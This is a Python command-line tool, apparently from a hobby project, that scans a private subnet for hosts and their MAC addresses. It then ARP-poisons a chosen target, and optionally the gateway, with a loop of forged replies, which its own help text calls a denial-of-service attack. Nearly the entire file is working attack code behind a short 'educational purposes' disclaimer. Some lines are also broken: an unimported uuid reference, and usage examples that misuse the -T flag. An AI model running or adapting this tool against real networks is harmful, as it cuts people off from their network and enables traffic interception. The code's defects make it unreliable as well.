#imports
from scapy.all import *
from collections import OrderedDict
from addons.ui import Ui
from termcolor import colored

import argparse
import os
from sys import stderr, exit, stdout
from uuid import getnode
from time import sleep
import ipaddress as ip 
import threading
import queue


class Arpy:
    LOGO1 = """
             _____  
     /\     |  __ \ 
    /  \    | |__) |
   / /\ \   |  _  / 
  / ____ \  | | \ \ 
 /_/    \_\ |_|  \_\\"""
    LOGO2 = """
  _____   __     __
 |  __ \  \ \   / /
 | |__) |  \ \_/ / 
 |  ___/    \   /  
 | |         | |   
 |_|         |_|   
                """
    MSG = "This is the command line interface for Arpy, please do not use this for malicious purposes, this is purely for educational purpose"

    __INTERVAL = 3
    __IP_QUEUE = queue.Queue()
    __LOCAL_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    __IP_TO_MAC = dict()
    __INDEX_TO_IP = OrderedDict()
    __OS_NAME = os.name
    __THREADS = list()
    
    def __init__(self, subnet:str, gateway:str, mac:str = __LOCAL_MAC, interval:int = __INTERVAL,two_way_flag:bool = False):
        self.__MAC = mac 
        self.subnet = subnet
        self.gateway = gateway
        self.interval = interval
        self.two_way_flag = two_way_flag
        
        self.__check_obj_attribute()
        
        for ip_addr in list(self.subnet.hosts()):
            self.__IP_QUEUE.put(str(ip_addr))
        if os.name == "nt":
           try:
               from colorama import init 
               init()
           except Exception as e:
               print(e)
                
        self.__UI()
    
    def __check_obj_attribute(self):

        try:
           
           private_subnet =  ip.IPv4Network(self.subnet).is_private
           private_gateway = ip.ip_address(self.gateway).is_private
           self.subnet = ip.IPv4Network(self.subnet)
           
           if private_subnet and private_gateway:
              pass 
           else:
              exit("\nIp address is not private, please check both network address and IP address of gateway")
        
        except ip.AddressValueError:
            exit("\nInvalid IP Address") 
        
        except ip.NetmaskValueError:
            exit("\nInvalid subnet mask value")
        
        if (type(self.interval) is int) :
            if (self.interval > 0):
                pass
            else:
                raise ValueError(f"self.interval={self.interval}, should be a positive integer")
        elif (type(self.interval is None)):
             self.interval = self.__INTERVAL
        else:
          self.__error("self.interval", 2, TypeError )
        
        if type(self.two_way_flag) is not bool:
           self.__error("self.two_way_flag", True, TypeError )
        

        
    def __error(self, var:str , correct_type, err_name):
        variable_value = eval(var)
        error=err_name(f"{var}={variable_value}, is of type {type(variable_value)}, it should be of type {type(correct_type)}")
        raise error

 

    def __UI(self):
        print(self.LOGO1,colored(self.LOGO2, "green"))
        print(colored(self.MSG,"green"))
        print("[*] Object Attributes seems ok")
        
        if self.__OS_NAME == "nt":
           print(f"[*] Windows detected as OS")
        
        elif self.__OS_NAME == "posix":
           print("[*] Linux detected as OS, you may need to run the program as root")
        
        else:
           exit("[-]Unknown OS, exiting program")    

        if self.two_way_flag :
           print("[*] Two way poisoning: Enabled")
        else:
           print("[*] Two way poisoning: Disabled") 

    def __get_mac(self,target=None):
        
        if target is None:
            while True:
              try:
                 current_ip=self.__IP_QUEUE.get_nowait()
                 print("{}\r".format(current_ip),end="")
                 arp_ans = sr1(ARP(pdst=current_ip,hwlen=6,plen=4, op=1), verbose=False,timeout=1)
                 tgt_mac = arp_ans[0].hwsrc
                 self.__IP_TO_MAC.update({current_ip:tgt_mac})
              except queue.Empty:
                   break
                   
              except TypeError:
                   pass

              except KeyboardInterrupt:
                   exit()
        else:
            try:
              
                arp_ans = sr1(ARP(pdst=target,hwlen=6,plen=4, op=1), verbose=False,timeout=1)
                tgt_mac = arp_ans[0].hwsrc
                self.__IP_TO_MAC.update({target:tgt_mac})
            
            except TypeError:
                exit("\nTarget is down or did not respond")
            
            except KeyboardInterrupt:
                exit("\n User ended program")


    
    def get_mac(self,target=None,threads=5):
        
        if (type(threads) is float) or (type(threads) is int):
           threads = int(abs(threads))
        else:
            raise TypeError(f"thread={threads}, is of type {type(threads)}, it should be of type {type(1)}")

        if target is None:
           print(f"[*] Starting {threads} threads")
           sleep(2)
           for _ in range(threads):
              self.__THREADS.append(threading.Thread(target=self.__get_mac,daemon=True))
           
           for thread in self.__THREADS:
               thread.start()

           for thread in self.__THREADS:
               thread.join()
        else:
           self.__get_mac(target)
   
    def set_mac(self,mac): 
        self.__MAC = mac

    def shell(self):
        print("")
        for index,key in enumerate(self.__IP_TO_MAC):
            print("{} | {} -> {}".format(index,key,self.__IP_TO_MAC.get(key)))
            self.__INDEX_TO_IP.update({int(index):key})
        print("")
        while True:
               try:
               
                first_index = list(self.__INDEX_TO_IP.keys())[0]
                last_index = list(self.__INDEX_TO_IP.keys())[-1]
                uindex = int(input("Enter index of target to attack[{}-{}]: ".format(first_index,last_index)))
                
                if (uindex >= first_index and uindex <= last_index):
                   self.__inject_packet(uindex, interval=self.interval)

              
               except ValueError:
                 exit("\nInvalid input")
               except KeyboardInterrupt:
                 exit("\nUser ended program")
               except Exception as e:
                 exit(f"{e}")

    def __inject_packet(self,uindex, interval):
        
            try:
                 unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=parse.gateway_ip, pdst=self.__INDEX_TO_IP.get(uindex), hwdst=self.__IP_TO_MAC.get(self.__INDEX_TO_IP.get(uindex)))
                 unsolicited_arp_rep_to_gtw = ARP(op=2,psrc=self.__INDEX_TO_IP.get(uindex), pdst=self.gateway, hwdst=self.__IP_TO_MAC.get(self.gateway), hwsrc=self.__LOCAL_MAC)
                 count = 1
                 stdout.write("DOS attack in progress. Press CTRL+C to end\n")
                 threading.Thread(target=Ui.load, daemon=True).start()

                 while True :
                     send(unsolicited_arp_rep_to_tgt,verbose=False)
                     if self.two_way_flag:
                        send(unsolicited_arp_rep_to_gtw, verbose=False)
                     stdout.write("   Packet(s) sent : {}\r".format(count))
                     count += 1
                     sleep(interval)
            except KeyboardInterrupt:
                exit("\nUser ended program")
           



if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(formatter_class = argparse.RawTextHelpFormatter,description="This script shows how easily a malicious user can cause a Denial Of Service attack in a home network once he is connect to it. NOTE : This is for demonstration purposes only and will not work in an enterprise environment where security mechanisms such as dynamic ARP inspection(DAI) are enabled.\n\n To truly how this work I would recommed to use wireshark",epilog="Example:\n\tsudo python3 arp_dos.py -S 192.168.100.0/24 -T 192.168.100.112 -G 192.168.100.1\n\tsudo python3 arp_dos.py  -T 192.168.100.112 -G 192.168.100.1\n\tsudo python3 arp_dos.py  -S 192.168.100.0/24 -G 192.168.100.1" )
    parser.add_argument("-S","--subnet",help="Network address of subnet e.g 192.168.100.0/24",metavar="subnet_ip", required=True, dest="subnet",type=str)
    parser.add_argument("-G","--gateway", help="IP address of default gateway",metavar="gateway_ip ",required=True,dest="gateway_ip")
    parser.add_argument("-Tgt", "--target", help="Ip address of target", dest="target", required=False, default=None)
    parser.add_argument("-T", "--threads", help="Number of threads to use when scanning network, defaults to 5", dest="threads", required=False, type=int, default=5)
    parser.add_argument("-I","--interval", help="Elapsed second between each ARP packet when Arpying ARP cache of target", required=False,dest="interval", metavar="interval", type=int)
    parser.add_argument("-2", help="enables 2 way poisoning, defaults to False",action="store_true", required=False, dest="twoway")
    parse = parser.parse_args()
 
    
    psn = Arpy(parse.subnet, parse.gateway_ip, interval = parse.interval,two_way_flag=parse.twoway)
    psn.get_mac(threads=parse.threads,target = parse.target)
    psn.shell()   
 







